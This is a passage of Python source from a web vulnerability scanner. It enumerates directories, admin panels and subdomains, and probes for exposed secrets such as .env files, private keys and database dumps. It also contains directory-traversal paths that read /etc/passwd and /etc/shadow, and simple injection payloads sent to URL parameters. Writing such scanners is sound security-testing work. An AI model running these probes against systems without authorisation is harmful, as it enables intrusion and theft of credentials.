                        'referrer-policy': response.headers.get('referrer-policy', 'missing')
                    }
                }
        except Exception as e:
            self.config.logger.debug(f"HTTP analysis error: {e}")
            return {'error': str(e)}

    async def _network_packet_analysis(self, url: str) -> Dict:
        """Basic network analysis using Scapy (requires root/admin privileges)"""
        if not SCAPY_AVAILABLE:
            return {'error': 'Scapy library not available'}
        
        try:
            domain = urlparse(url).netloc
            
            # Basic ping analysis
            try:
                ip_address = socket.gethostbyname(domain)
                
                # ICMP ping (requires privileges)
                ping_result = scapy.sr1(scapy.IP(dst=ip_address)/scapy.ICMP(), timeout=2, verbose=0)
                
                if ping_result:
                    return {
                        'icmp_response': True,
                        'ttl': ping_result.ttl,
                        'response_time': f"{ping_result.time:.2f}ms",
                        'ip_version': ping_result.version
                    }
                else:
                    return {'icmp_response': False}
            except Exception as e:
                return {'error': f"Network analysis requires elevated privileges: {e}"}
        except Exception as e:
            self.config.logger.debug(f"Packet analysis error: {e}")
            return {'error': str(e)}

    # === Advanced Discovery & Intelligence Methods ===

    async def _advanced_webpage_discovery(self, url: str) -> Dict:
        """Advanced webpage discovery using multiple techniques"""
        discovery_results = {
            'total_pages': 0,
            'discovered_pages': [],
            'hidden_directories': [],
            'backup_files': [],
            'config_files': [],
            'robots_txt_analysis': {},
            'sitemap_analysis': {},
            'javascript_endpoints': [],
            'api_endpoints': [],
            'admin_panels': []
        }
        
        try:
            domain = urlparse(url).netloc
            base_url = f"{urlparse(url).scheme}://{domain}"
            
            # Robots.txt analysis
            try:
                robots_url = f"{base_url}/robots.txt"
                status, headers, content, final_url = await self.session.get(robots_url)
                if status == 200 and content:
                    discovery_results['robots_txt_analysis'] = {
                        'found': True,
                        'disallowed_paths': [],
                        'allowed_paths': [],
                        'crawl_delay': None,
                        'sitemaps': []
                    }
                    
                    for line in content.split('\n'):
                        line = line.strip()
                        if line.startswith('Disallow:'):
                            path = line.split(':', 1)[1].strip()
                            if path and path != '/':
                                discovery_results['robots_txt_analysis']['disallowed_paths'].append(path)
                                discovery_results['discovered_pages'].append(f"{base_url}{path}")
                        elif line.startswith('Allow:'):
                            path = line.split(':', 1)[1].strip()
                            discovery_results['robots_txt_analysis']['allowed_paths'].append(path)
                        elif line.startswith('Sitemap:'):
                            sitemap_url = line.split(':', 1)[1].strip()
                            discovery_results['robots_txt_analysis']['sitemaps'].append(sitemap_url)
            except:
                discovery_results['robots_txt_analysis'] = {'found': False}
            
            # Sitemap.xml analysis
            try:
                sitemap_url = f"{base_url}/sitemap.xml"
                status, headers, content, final_url = await self.session.get(sitemap_url)
                if status == 200 and content and LXML_AVAILABLE:
                    discovery_results['sitemap_analysis'] = {
                        'found': True,
                        'urls': [],
                        'last_modified': []
                    }
                    
                    try:
                        root = etree.fromstring(content.encode())
                        for url_elem in root.findall('.//{http://www.sitemaps.org/schemas/sitemap/0.9}url'):
                            loc = url_elem.find('{http://www.sitemaps.org/schemas/sitemap/0.9}loc')
                            if loc is not None:
                                discovery_results['sitemap_analysis']['urls'].append(loc.text)
                                discovery_results['discovered_pages'].append(loc.text)
                    except:
                        pass
            except:
                discovery_results['sitemap_analysis'] = {'found': False}
            
            # Common directory enumeration
            common_dirs = [
                '/admin', '/administrator', '/wp-admin', '/cpanel', '/control', '/panel',
                '/api', '/v1', '/v2', '/swagger', '/docs', '/documentation',
                '/backup', '/backups', '/bak', '/old', '/tmp', '/temp',
                '/test', '/testing', '/dev', '/development', '/staging',
                '/config', '/configuration', '/settings', '/setup',
                '/uploads', '/files', '/assets', '/static', '/images',
                '/private', '/secure', '/protected', '/restricted'
            ]
            
            dir_tasks = []
            for directory in common_dirs:
                dir_tasks.append(self._check_directory_exists(base_url, directory))
            
            dir_results = await asyncio.gather(*dir_tasks, return_exceptions=True)
            for i, result in enumerate(dir_results):
                if result and not isinstance(result, Exception):
                    discovery_results['hidden_directories'].append(common_dirs[i])
                    discovery_results['discovered_pages'].append(f"{base_url}{common_dirs[i]}")
            
            # Backup and config file detection
            backup_extensions = ['.bak', '.backup', '.old', '.orig', '.copy', '.tmp']
            config_files = [
                '/config.php', '/config.ini', '/config.xml', '/config.json',
                '/settings.php', '/settings.ini', '/app.config', '/web.config',
                '/.env', '/.env.local', '/.env.production', '/composer.json',
                '/package.json', '/Gemfile', '/requirements.txt', '/pom.xml'
            ]
            
            file_tasks = []
            for config_file in config_files:
                file_tasks.append(self._check_file_exists(base_url, config_file))
            
            file_results = await asyncio.gather(*file_tasks, return_exceptions=True)
            for i, result in enumerate(file_results):
                if result and not isinstance(result, Exception):
                    discovery_results['config_files'].append(config_files[i])
                    discovery_results['discovered_pages'].append(f"{base_url}{config_files[i]}")
            
            # Admin panel detection
            admin_paths = [
                '/admin', '/administrator', '/wp-admin', '/admin.php', '/admin.html',
                '/login', '/signin', '/auth', '/portal', '/dashboard',
                '/manager', '/management', '/control', '/cpanel'
            ]
            
            admin_tasks = []
            for admin_path in admin_paths:
                admin_tasks.append(self._check_admin_panel(base_url, admin_path))
            
            admin_results = await asyncio.gather(*admin_tasks, return_exceptions=True)
            for i, result in enumerate(admin_results):
                if result and not isinstance(result, Exception):
                    discovery_results['admin_panels'].append(admin_paths[i])
                    discovery_results['discovered_pages'].append(f"{base_url}{admin_paths[i]}")
            
            # JavaScript endpoint extraction
            try:
                status, headers, content, final_url = await self.session.get(url)
                if content and BS4_AVAILABLE:
                    soup = BeautifulSoup(content, 'html.parser')
                    
                    # Extract from script tags
                    for script in soup.find_all('script'):
                        if script.string:
                            # Look for API endpoints in JavaScript
                            import re
                            api_patterns = [
                                r'["\']/(api|API)/[^"\']*["\']',
                                r'["\']https?://[^"\']*api[^"\']*["\']',
                                r'fetch\(["\']([^"\']*)["\']',
                                r'xhr\.open\(["\'][^"\']*["\'],\s*["\']([^"\']*)["\']'
                            ]
                            
                            for pattern in api_patterns:
                                matches = re.findall(pattern, script.string)
                                for match in matches:
                                    endpoint = match if isinstance(match, str) else match[0] if match else None
                                    if endpoint and endpoint not in discovery_results['api_endpoints']:
                                        discovery_results['api_endpoints'].append(endpoint)
                                        if not endpoint.startswith('http'):
                                            discovery_results['discovered_pages'].append(f"{base_url}{endpoint}")
                                        else:
                                            discovery_results['discovered_pages'].append(endpoint)
            except:
                pass
            
            # Update total count
            discovery_results['total_pages'] = len(set(discovery_results['discovered_pages']))
            
            return discovery_results
            
        except Exception as e:
            self.config.logger.debug(f"Webpage discovery error: {e}")
            return discovery_results

    async def _check_directory_exists(self, base_url: str, directory: str) -> bool:
        """Check if a directory exists"""
        try:
            status, headers, content, final_url = await self.session.get(f"{base_url}{directory}")
            return status in [200, 301, 302, 403]  # Include forbidden as it indicates existence
        except:
            return False

    async def _check_file_exists(self, base_url: str, file_path: str) -> bool:
        """Check if a file exists"""
        try:
            status, headers, content, final_url = await self.session.get(f"{base_url}{file_path}")
            return status == 200
        except:
            return False

    async def _check_admin_panel(self, base_url: str, admin_path: str) -> bool:
        """Check if admin panel exists"""
        try:
            status, headers, content, final_url = await self.session.get(f"{base_url}{admin_path}")
            if status in [200, 301, 302]:
                # Check if it looks like an admin panel
                if content and any(keyword in content.lower() for keyword in ['login', 'username', 'password', 'admin', 'dashboard']):
                    return True
            return False
        except:
            return False

    async def _advanced_file_leak_detection(self, url: str) -> Dict:
        """Advanced file leak detection and analysis"""
        leak_results = {
            'total_leaks': 0,
            'sensitive_files': [],
            'database_backups': [],
            'source_code_leaks': [],
            'configuration_leaks': [],
            'credential_files': [],
            'log_files': [],
            'documentation_leaks': [],
            'certificate_files': [],
            'key_files': [],
            'archive_files': []
        }
        
        try:
            domain = urlparse(url).netloc
            base_url = f"{urlparse(url).scheme}://{domain}"
            
            # Sensitive file patterns
            sensitive_patterns = {
                'database_backups': [
                    '/database.sql', '/db.sql', '/backup.sql', '/dump.sql',
                    '/database.sql.gz', '/db.tar.gz', '/mysql.sql',
                    '/postgres.sql', '/mongodb.json', '/redis.rdb'
                ],
                'source_code_leaks': [
                    '/.git/config', '/.svn/entries', '/.hg/hgrc',
                    '/composer.json', '/package.json', '/requirements.txt',
                    '/Gemfile', '/pom.xml', '/build.gradle'
                ],
                'configuration_leaks': [
                    '/.env', '/.env.local', '/.env.production', '/.env.development',
                    '/config.php', '/config.ini', '/app.config', '/web.config',
                    '/settings.xml', '/application.properties', '/hibernate.cfg.xml'
                ],
                'credential_files': [
                    '/passwd', '/shadow', '/htpasswd', '/.htpasswd',
                    '/users.txt', '/passwords.txt', '/credentials.txt',
                    '/ssh/id_rsa', '/ssh/id_dsa', '/ssh/authorized_keys'
                ],
                'log_files': [
                    '/error.log', '/access.log', '/debug.log', '/application.log',
                    '/error_log', '/access_log', '/php_errors.log',
                    '/catalina.out', '/server.log', '/system.log'
                ],
                'documentation_leaks': [
                    '/README.md', '/CHANGELOG.md', '/TODO.txt', '/INSTALL.txt',
                    '/documentation.pdf', '/manual.pdf', '/api-docs.json',
                    '/swagger.json', '/openapi.json', '/postman.json'
                ],
                'certificate_files': [
                    '/cert.pem', '/certificate.crt', '/ssl.crt', '/server.crt',
                    '/ca.crt', '/intermediate.crt', '/fullchain.pem'
                ],
                'key_files': [
                    '/private.key', '/server.key', '/ssl.key', '/rsa.key',
                    '/dsa.key', '/ecdsa.key', '/id_rsa', '/id_dsa'
                ],
                'archive_files': [
                    '/backup.zip', '/backup.tar.gz', '/site.zip', '/www.tar.gz',
                    '/source.zip', '/code.tar.gz', '/files.rar', '/data.7z'
                ]
            }
            
            # Check each category
            for category, file_list in sensitive_patterns.items():
                file_tasks = []
                for file_path in file_list:
                    file_tasks.append(self._check_sensitive_file(base_url, file_path))
                
                file_results = await asyncio.gather(*file_tasks, return_exceptions=True)
                for i, result in enumerate(file_results):
                    if result and not isinstance(result, Exception):
                        leak_results[category].append(file_list[i])
                        leak_results['sensitive_files'].append(file_list[i])
            
            # Directory traversal attempts
            traversal_paths = [
                '/../../etc/passwd', '/../../etc/shadow', '/../../etc/hosts',
                '/../../windows/system32/drivers/etc/hosts',
                '/../../boot.ini', '/../../windows/win.ini'
            ]
            
            for path in traversal_paths:
                try:
                    status, headers, content, final_url = await self.session.get(f"{base_url}{path}")
                    if status == 200 and content:
                        if any(indicator in content.lower() for indicator in ['root:', 'daemon:', '[boot loader]', '[fonts]']):
                            leak_results['sensitive_files'].append(path)
                            if 'directory_traversal' not in leak_results:
                                leak_results['directory_traversal'] = []
                            leak_results['directory_traversal'].append(path)
                except:
                    pass
            
            # Update total count
            leak_results['total_leaks'] = len(leak_results['sensitive_files'])
            
            return leak_results
            
        except Exception as e:
            self.config.logger.debug(f"File leak detection error: {e}")
            return leak_results

    async def _check_sensitive_file(self, base_url: str, file_path: str) -> bool:
        """Check if a sensitive file exists and is accessible"""
        try:
            status, headers, content, final_url = await self.session.get(f"{base_url}{file_path}")
            if status == 200 and content:
                # Verify it's actually the expected file type
                if file_path.endswith(('.sql', '.gz', '.tar.gz')) and len(content) > 100:
                    return True
                elif file_path.endswith(('.json', '.xml', '.ini', '.txt')) and len(content) > 50:
                    return True
                elif file_path.endswith(('.log')) and 'log' in content.lower():
                    return True
                elif file_path.endswith(('.key', '.pem', '.crt')) and any(marker in content for marker in ['BEGIN', 'END', 'KEY', 'CERTIFICATE']):
                    return True
                elif len(content) > 10:  # Basic existence check
                    return True
            return False
        except:
            return False

    async def _advanced_parameter_enumeration(self, url: str) -> Dict:
        """Advanced parameter enumeration and analysis"""
        param_results = {
            'total_parameters': 0,
            'get_parameters': [],
            'post_parameters': [],
            'hidden_parameters': [],
            'injectable_parameters': [],
            'file_upload_parameters': [],
            'authentication_parameters': [],
            'session_parameters': [],
            'api_parameters': [],
            'json_parameters': [],
            'xml_parameters': []
        }
        
        try:
            # Common parameter names for testing
            common_params = [
                'id', 'user', 'username', 'email', 'password', 'token', 'session',
                'file', 'path', 'url', 'redirect', 'callback', 'return',
                'search', 'query', 'q', 'keyword', 'term',
                'page', 'limit', 'offset', 'sort', 'order',
                'category', 'type', 'action', 'method', 'function',
                'data', 'value', 'content', 'message', 'comment'
            ]
            
            # Test GET parameters
            for param in common_params:
                test_url = f"{url}{'&' if '?' in url else '?'}{param}=test"
                try:
                    status, headers, content, final_url = await self.session.get(test_url)
                    if status == 200:
                        # Check if parameter affects response
                        original_status, _, original_content, _ = await self.session.get(url)
                        if content != original_content:
                            param_results['get_parameters'].append(param)
                            
                            # Test for injection vulnerabilities
                            if await self._test_parameter_injection(url, param, 'GET'):
                                param_results['injectable_parameters'].append(f"GET:{param}")
                except:
                    pass
            
            # Test POST parameters via form detection
            try:
                status, headers, content, final_url = await self.session.get(url)
                if content and BS4_AVAILABLE:
                    soup = BeautifulSoup(content, 'html.parser')
                    
                    # Find forms and extract parameters
                    for form in soup.find_all('form'):
                        for input_tag in form.find_all(['input', 'textarea', 'select']):
                            param_name = input_tag.get('name')
                            param_type = input_tag.get('type', 'text')
                            
                            if param_name:
                                param_results['post_parameters'].append(param_name)
                                
                                # Categorize parameters
                                if param_type == 'file':
                                    param_results['file_upload_parameters'].append(param_name)
                                elif param_name.lower() in ['username', 'password', 'email', 'login']:
                                    param_results['authentication_parameters'].append(param_name)
                                elif param_name.lower() in ['session', 'token', 'csrf']:
                                    param_results['session_parameters'].append(param_name)
                                elif param_type == 'hidden':
                                    param_results['hidden_parameters'].append(param_name)
            except:
                pass
            
            # API parameter detection via JavaScript analysis
            try:
                status, headers, content, final_url = await self.session.get(url)
                if content:
                    import re
                    
                    # Extract JSON API parameters
                    json_patterns = [
                        r'"(\w+)"\s*:\s*"[^"]*"',
                        r"'(\w+)'\s*:\s*'[^']*'",
                        r'(\w+)\s*:\s*["\'][^"\']*["\']'
                    ]
                    
                    for pattern in json_patterns:
                        matches = re.findall(pattern, content)
                        for match in matches:
                            if isinstance(match, str) and match not in param_results['json_parameters']:
                                param_results['json_parameters'].append(match)
                                param_results['api_parameters'].append(f"JSON:{match}")
                    
                    # Extract XML parameters
                    xml_pattern = r'<(\w+)[^>]*>'
                    xml_matches = re.findall(xml_pattern, content)
                    for match in xml_matches:
                        if match not in ['html', 'head', 'body', 'div', 'span', 'a', 'p', 'script', 'style']:
                            if match not in param_results['xml_parameters']:
                                param_results['xml_parameters'].append(match)
                                param_results['api_parameters'].append(f"XML:{match}")
            except:
                pass
            
            # Update total count
            all_params = (param_results['get_parameters'] + param_results['post_parameters'] + 
                         param_results['hidden_parameters'] + param_results['api_parameters'])
            param_results['total_parameters'] = len(set(all_params))
            
            return param_results
            
        except Exception as e:
            self.config.logger.debug(f"Parameter enumeration error: {e}")
            return param_results

    async def _test_parameter_injection(self, url: str, param: str, method: str = 'GET') -> bool:
        """Test parameter for injection vulnerabilities"""
        try:
            # Simple injection payloads
            injection_payloads = ["'", '"', '<script>', '{{7*7}}', '${7*7}', '#{7*7}']
            
            for payload in injection_payloads:
                if method == 'GET':
                    test_url = f"{url}{'&' if '?' in url else '?'}{param}={payload}"
                    status, headers, content, final_url = await self.session.get(test_url)
                else:
                    # POST testing would require form handling
                    return False
                
                if content and any(indicator in content.lower() for indicator in [
                    'sql', 'mysql', 'error', 'warning', 'exception', 'stack trace', '49', 'syntax'
                ]):
                    return True
            
            return False
        except:
            return False

    async def _comprehensive_vulnerability_scan(self, url: str) -> List[Dict]:
        """Comprehensive vulnerability scanning with enhanced detection"""
        enhanced_findings = []
        
        # Run all advanced reconnaissance
        if SHODAN_AVAILABLE:
            shodan_info = await self._advanced_shodan_reconnaissance(url)
            if 'vulnerabilities' in shodan_info and shodan_info['vulnerabilities']:
                for vuln in shodan_info['vulnerabilities']:
                    enhanced_findings.append(self._create_finding(
                        'Shodan Vulnerability', 'HIGH',
                        f"Known vulnerability detected: {vuln}",
                        url, cve_id=vuln if vuln.startswith('CVE-') else None
                    ))
        
        # Enhanced technology detection
        if BUILTWITH_AVAILABLE:
            tech_info = await self._advanced_technology_detection(url)
            if 'error' not in tech_info:
                # Check for outdated technologies
                outdated_tech = []
                for category, technologies in tech_info.items():
                    for tech in technologies:
                        if any(old_tech in tech.lower() for old_tech in ['old', 'legacy', 'deprecated']):
                            outdated_tech.append(f"{category}: {tech}")
                
                if outdated_tech:
                    enhanced_findings.append(self._create_finding(
                        'Outdated Technology', 'MEDIUM',
                        f"Outdated technologies detected: {', '.join(outdated_tech)}",
                        url
                    ))
        
        # SSL/TLS vulnerabilities
        if SSLYZE_AVAILABLE and url.startswith('https://'):
            ssl_info = await self._advanced_ssl_analysis(url)
            if 'vulnerabilities' in ssl_info and ssl_info['vulnerabilities']:
                for vuln in ssl_info['vulnerabilities']:
                    enhanced_findings.append(self._create_finding(
                        'SSL/TLS Vulnerability', 'HIGH',
                        f"SSL/TLS vulnerability: {vuln}",
                        url
                    ))
        
        # DNS vulnerabilities
        if DNS_AVAILABLE:
            dns_info = await self._advanced_dns_reconnaissance(url)
            if dns_info.get('zone_transfer') and 'Possible' in dns_info['zone_transfer']:
                enhanced_findings.append(self._create_finding(
                    'DNS Zone Transfer', 'HIGH',
                    f"DNS zone transfer possible: {dns_info['zone_transfer']}",
                    url
                ))
        
        return enhanced_findings

    async def _website_structure_mapping(self, url: str) -> Dict:
        """Comprehensive website structure mapping and URL discovery"""
        structure_results = {
            'base_url': url,
            'discovered_urls': [],
            'structure_analysis': {},
            'crawl_statistics': {},
            'per_url_vulnerabilities': {},
            'robots_analysis': {},
            'sitemap_analysis': {},
            'directory_enumeration': {},
            'subdomain_enumeration': {},
            'error': None
        }
        
        try:
            import urllib.parse
            from collections import deque
            import threading
            from urllib.robotparser import RobotFileParser
            import mimetypes
            import hashlib
            
            base_domain = urllib.parse.urlparse(url).netloc
            discovered_urls = set()
            crawl_queue = deque([url])
            processed_urls = set()
            
            # Robots.txt analysis
            robots_url = f"{urllib.parse.urlparse(url).scheme}://{base_domain}/robots.txt"
            robots_info = await self._analyze_robots_txt(robots_url)
            structure_results['robots_analysis'] = robots_info
            
            # Sitemap discovery
            sitemap_info = await self._discover_sitemaps(url)
            structure_results['sitemap_analysis'] = sitemap_info
            
            # Directory enumeration
            directory_info = await self._enumerate_directories(url)
            structure_results['directory_enumeration'] = directory_info
            
            # Subdomain enumeration
            subdomain_info = await self._enumerate_subdomains(base_domain)
            structure_results['subdomain_enumeration'] = subdomain_info
            
            # Advanced web crawling with depth control
            max_depth = 3
            max_urls = 50  # Limit for demonstration
            
            for depth in range(max_depth):
                if not crawl_queue or len(discovered_urls) >= max_urls:
                    break
                    
                current_level_urls = list(crawl_queue)
                crawl_queue.clear()
                
                for current_url in current_level_urls:
                    if current_url in processed_urls or len(discovered_urls) >= max_urls:
                        continue
                        
                    processed_urls.add(current_url)
                    
                    try:
                        # Fetch page content
                        status, headers, content, final_url = await self.session.get(current_url)
                        
                        if status == 200 and content:
                            discovered_urls.add(current_url)
                            
                            # Extract links from content
                            new_urls = await self._extract_urls_from_content(content, current_url)
                            
                            # Filter and add to queue for next depth
                            for new_url in new_urls:
                                if (new_url not in processed_urls and 
                                    urllib.parse.urlparse(new_url).netloc == base_domain and
                                    len(discovered_urls) < max_urls):
                                    crawl_queue.append(new_url)
                                    
                    except Exception as e:
                        self.config.logger.debug(f"Error crawling {current_url}: {e}")
                        continue
            
            # Convert to list and sort
            structure_results['discovered_urls'] = sorted(list(discovered_urls))
            
            # Analyze structure
            structure_analysis = await self._analyze_website_structure(discovered_urls)
            structure_results['structure_analysis'] = structure_analysis
            
            # Crawl statistics
            structure_results['crawl_statistics'] = {
                'total_urls_discovered': len(discovered_urls),
                'total_urls_processed': len(processed_urls),
                'crawl_depth_achieved': min(max_depth, len(discovered_urls) // 10 + 1),
                'unique_directories': len(set(urllib.parse.urlparse(u).path.split('/')[1] for u in discovered_urls if urllib.parse.urlparse(u).path.split('/')[1])),
                'file_types_discovered': len(set(self._get_file_extension(u) for u in discovered_urls)),
                'parameters_found': sum(1 for u in discovered_urls if '?' in u)
            }
            
            # Per-URL vulnerability analysis
            structure_results['per_url_vulnerabilities'] = await self._analyze_per_url_vulnerabilities(discovered_urls)
            
            return structure_results
            
        except Exception as e:
            self.config.logger.debug(f"Website structure mapping error: {e}")
            structure_results['error'] = str(e)
            return structure_results

    async def _analyze_robots_txt(self, robots_url: str) -> Dict:
        """Analyze robots.txt file"""
        robots_info = {
            'exists': False,
            'user_agents': [],
            'disallowed_paths': [],
            'allowed_paths': [],
            'sitemaps': [],
            'crawl_delay': None,
            'interesting_findings': []
        }
        
        try:
            status, headers, content, final_url = await self.session.get(robots_url)
            
            if status == 200 and content:
                robots_info['exists'] = True
                lines = content.split('\n')
                
                current_user_agent = None
                for line in lines:
                    line = line.strip()
                    if line.lower().startswith('user-agent:'):
                        current_user_agent = line.split(':', 1)[1].strip()
                        robots_info['user_agents'].append(current_user_agent)
                    elif line.lower().startswith('disallow:'):
                        path = line.split(':', 1)[1].strip()
                        robots_info['disallowed_paths'].append(path)
                        # Check for interesting paths
                        if any(keyword in path.lower() for keyword in ['admin', 'private', 'secret', 'config', 'backup']):
                            robots_info['interesting_findings'].append(f"Sensitive path disclosed: {path}")
                    elif line.lower().startswith('allow:'):
                        path = line.split(':', 1)[1].strip()
                        robots_info['allowed_paths'].append(path)
                    elif line.lower().startswith('sitemap:'):
                        sitemap = line.split(':', 1)[1].strip()
                        robots_info['sitemaps'].append(sitemap)
                    elif line.lower().startswith('crawl-delay:'):
                        robots_info['crawl_delay'] = line.split(':', 1)[1].strip()
            
        except Exception as e:
            self.config.logger.debug(f"Robots.txt analysis error: {e}")
        
        return robots_info

    async def _discover_sitemaps(self, url: str) -> Dict:
        """Discover and analyze sitemaps"""
        sitemap_info = {
            'sitemaps_found': [],
            'total_urls': 0,
            'url_patterns': [],
            'last_modified': [],
            'priority_analysis': {}
        }
        
        try:
            import urllib.parse
            base_url = f"{urllib.parse.urlparse(url).scheme}://{urllib.parse.urlparse(url).netloc}"
            
            # Common sitemap locations
            sitemap_paths = [
                '/sitemap.xml',
                '/sitemap_index.xml',
                '/sitemap.txt',
                '/sitemaps.xml',
                '/sitemap1.xml'
            ]
            
            for path in sitemap_paths:
                sitemap_url = base_url + path
                try:
                    status, headers, content, final_url = await self.session.get(sitemap_url)
                    
                    if status == 200 and content:
                        sitemap_info['sitemaps_found'].append(sitemap_url)
                        
                        # Basic XML parsing for URL count
                        if '<loc>' in content:
                            urls_count = content.count('<loc>')
                            sitemap_info['total_urls'] += urls_count
                            
                        # Check for lastmod dates
                        if '<lastmod>' in content:
                            lastmod_count = content.count('<lastmod>')
                            sitemap_info['last_modified'].append(f"{sitemap_url}: {lastmod_count} dated entries")
                            
                except Exception as e:
                    continue
                    
        except Exception as e:
            self.config.logger.debug(f"Sitemap discovery error: {e}")
        
        return sitemap_info

    async def _enumerate_directories(self, url: str) -> Dict:
        """Enumerate common directories"""
        directory_info = {
            'existing_directories': [],
            'interesting_files': [],
            'status_codes': {},
            'redirect_chains': []
        }
        
        try:
            import urllib.parse
            base_url = f"{urllib.parse.urlparse(url).scheme}://{urllib.parse.urlparse(url).netloc}"
            
            # Common directories to check
            common_dirs = [
                'admin', 'administrator', 'login', 'wp-admin', 'cpanel',
                'api', 'v1', 'v2', 'docs', 'documentation',
                'backup', 'backups', 'old', 'test', 'staging',
                'config', 'configuration', 'settings',
                'uploads', 'files', 'assets', 'static',
                'logs', 'log', 'temp', 'tmp'
            ]
            
            # Common files to check
            common_files = [
                'robots.txt', 'sitemap.xml', '.htaccess', 'web.config',
                'phpinfo.php', 'info.php', 'test.php',
                'readme.txt', 'README.md', 'changelog.txt',
                'backup.zip', 'backup.sql', 'database.sql',
                '.env', '.git/config', '.svn/entries'
            ]
            
            # Check directories
            for directory in common_dirs:
                dir_url = f"{base_url}/{directory}/"
                try:
                    status, headers, content, final_url = await self.session.get(dir_url)
                    directory_info['status_codes'][dir_url] = status
                    
                    if status in [200, 301, 302, 403]:
                        directory_info['existing_directories'].append({
                            'url': dir_url,
                            'status': status,
                            'size': len(content) if content else 0
                        })
                        
                except Exception:
                    continue
            
            # Check files
            for file_name in common_files:
                file_url = f"{base_url}/{file_name}"
                try:
                    status, headers, content, final_url = await self.session.get(file_url)
                    
                    if status == 200:
                        directory_info['interesting_files'].append({
                            'url': file_url,
                            'status': status,
                            'size': len(content) if content else 0,
                            'type': self._get_file_type(file_name)
                        })
                        
                except Exception:
                    continue
                    
        except Exception as e:
            self.config.logger.debug(f"Directory enumeration error: {e}")
        
        return directory_info

    async def _enumerate_subdomains(self, domain: str) -> Dict:
        """Enumerate subdomains using common patterns"""
        subdomain_info = {
            'discovered_subdomains': [],
            'subdomain_count': 0,
            'interesting_subdomains': [],
            'ip_addresses': {}
        }
        
        try:
            # Common subdomain prefixes
            common_subdomains = [
                'www', 'mail', 'ftp', 'localhost', 'webmail', 'smtp',
                'pop', 'ns1', 'webdisk', 'ns2', 'cpanel', 'whm',
                'autodiscover', 'autoconfig', 'api', 'admin',
                'test', 'staging', 'dev', 'beta', 'demo'
            ]
            
            for subdomain in common_subdomains:
                full_domain = f"{subdomain}.{domain}"
                try:
                    # Simple DNS resolution check
                    import socket
                    ip = socket.gethostbyname(full_domain)
                    subdomain_info['discovered_subdomains'].append(full_domain)
                    subdomain_info['ip_addresses'][full_domain] = ip
                    
                    # Check if subdomain is interesting
                    if subdomain in ['admin', 'test', 'staging', 'dev', 'api']:
                        subdomain_info['interesting_subdomains'].append(full_domain)
                        
                except socket.gaierror:
                    continue
                except Exception:
                    continue
            
            subdomain_info['subdomain_count'] = len(subdomain_info['discovered_subdomains'])
            
        except Exception as e:
            self.config.logger.debug(f"Subdomain enumeration error: {e}")
        
        return subdomain_info

    async def _extract_urls_from_content(self, content: str, base_url: str) -> List[str]:
        """Extract URLs from HTML content"""
        urls = []
        
        try:
            import re
            import urllib.parse
            
            # Extract href attributes
            href_pattern = r'href=["\']([^"\']+)["\']'
            hrefs = re.findall(href_pattern, content, re.IGNORECASE)
            
            # Extract src attributes
            src_pattern = r'src=["\']([^"\']+)["\']'
            srcs = re.findall(src_pattern, content, re.IGNORECASE)
            
            # Extract action attributes
            action_pattern = r'action=["\']([^"\']+)["\']'
            actions = re.findall(action_pattern, content, re.IGNORECASE)
            
            all_links = hrefs + srcs + actions
            
            for link in all_links:
                try:
                    # Convert relative URLs to absolute
                    absolute_url = urllib.parse.urljoin(base_url, link)
                    
                    # Filter out non-HTTP URLs and fragments
                    if (absolute_url.startswith(('http://', 'https://')) and 
                        not absolute_url.endswith(('#', 'javascript:', 'mailto:')) and
                        '#' not in absolute_url.split('/')[-1]):
                        urls.append(absolute_url)
                        
                except Exception:
                    continue
            
            return list(set(urls))  # Remove duplicates
            
        except Exception as e:
            self.config.logger.debug(f"URL extraction error: {e}")
            return []

    async def _analyze_website_structure(self, discovered_urls: List[str]) -> Dict:
        """Analyze the structure of discovered URLs"""
        structure_analysis = {
            'directory_structure': {},
            'file_types': {},
            'parameter_analysis': {},
            'depth_analysis': {},
            'common_patterns': []
        }
        
        try:
            import urllib.parse
            from collections import defaultdict
            
            # Directory structure analysis
            directories = defaultdict(list)
            file_types = defaultdict(int)
            depths = defaultdict(int)
            parameters = defaultdict(int)
            
            for url in discovered_urls:
                parsed = urllib.parse.urlparse(url)
                path_parts = [p for p in parsed.path.split('/') if p]
                
                # Directory analysis
                if len(path_parts) > 1:
                    directory = '/' + '/'.join(path_parts[:-1])
                    directories[directory].append(url)
                
                # File type analysis
                file_ext = self._get_file_extension(url)
                if file_ext:
                    file_types[file_ext] += 1
                
                # Depth analysis
                depth = len(path_parts)
                depths[depth] += 1
                
                # Parameter analysis
                if parsed.query:
                    param_count = len(parsed.query.split('&'))
                    parameters[param_count] += 1
            
            structure_analysis['directory_structure'] = dict(directories)
            structure_analysis['file_types'] = dict(file_types)
            structure_analysis['depth_analysis'] = dict(depths)
            structure_analysis['parameter_analysis'] = dict(parameters)
            
            # Common patterns detection
            patterns = []
            if any('admin' in url.lower() for url in discovered_urls):
                patterns.append("Administrative interfaces detected")
            if any('api' in url.lower() for url in discovered_urls):
                patterns.append("API endpoints discovered")
            if any('upload' in url.lower() for url in discovered_urls):
                patterns.append("File upload functionality found")
            if any('.php' in url.lower() for url in discovered_urls):
                patterns.append("PHP application detected")
            if any('.asp' in url.lower() for url in discovered_urls):
                patterns.append("ASP.NET application detected")
            
            structure_analysis['common_patterns'] = patterns
            
        except Exception as e:
            self.config.logger.debug(f"Structure analysis error: {e}")
        
        return structure_analysis

    async def _analyze_per_url_vulnerabilities(self, discovered_urls: List[str]) -> Dict:
        """Analyze vulnerabilities for each discovered URL individually"""
        per_url_analysis = {}
        
        try:
            # Limit analysis to prevent excessive scanning time
            urls_to_analyze = discovered_urls[:20]  # Analyze first 20 URLs
            
            for url in urls_to_analyze:
                url_vulnerabilities = {
                    'url': url,
                    'response_analysis': {},
                    'header_analysis': {},
                    'content_analysis': {},
                    'form_analysis': {},
                    'javascript_analysis': {},
                    'security_issues': [],
                    'risk_score': 0,
                    'vulnerability_count': 0
                }
                
                try:
                    # Fetch URL details
                    status, headers, content, final_url = await self.session.get(url)
                    
                    if status == 200 and content:
                        # Response analysis
                        url_vulnerabilities['response_analysis'] = {
                            'status_code': status,
                            'final_url': final_url,
                            'content_length': len(content),
                            'response_time': 'N/A',  # Would need timing implementation
                            'redirects': final_url != url
                        }
                        
                        # Header analysis
                        header_issues = await self._analyze_security_headers(headers)
                        url_vulnerabilities['header_analysis'] = header_issues
                        
                        # Content analysis
                        content_issues = await self._analyze_content_security(content, url)
                        url_vulnerabilities['content_analysis'] = content_issues
                        
                        # Form analysis
                        form_issues = await self._analyze_forms_security(content, url)
                        url_vulnerabilities['form_analysis'] = form_issues
                        
                        # JavaScript analysis
                        js_issues = await self._analyze_javascript_security(content)
                        url_vulnerabilities['javascript_analysis'] = js_issues
                        
